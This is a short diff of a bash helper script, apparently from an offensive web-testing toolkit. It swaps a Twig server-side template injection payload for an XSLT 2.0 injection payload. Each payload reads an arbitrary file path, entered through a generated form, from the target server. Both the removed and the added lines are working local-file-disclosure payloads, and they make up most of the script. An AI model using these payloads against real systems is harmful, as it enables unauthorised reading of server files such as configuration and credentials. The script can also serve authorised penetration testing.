@@ -1,7 +1,7 @@
 #!/bin/bash
 
 : '
-SSTI - twig lfi dump file
+XSLT - lfi dump file (only works in version 2.0)
 '
 
 # Generate GUI form items (label, type (optional: default text), name, default (optional))
@@ -12,4 +12,4 @@ generate_form "${FILE_FIELD}"
 
 FILE=${form_data["file"]}
 
-execute_command "{{ \"${FILE}\"|file_excerpt(1,-1) }}"
+execute_command "<xsl:value-of select=\"unparsed-text('${FILE}', 'utf-8')\" />"
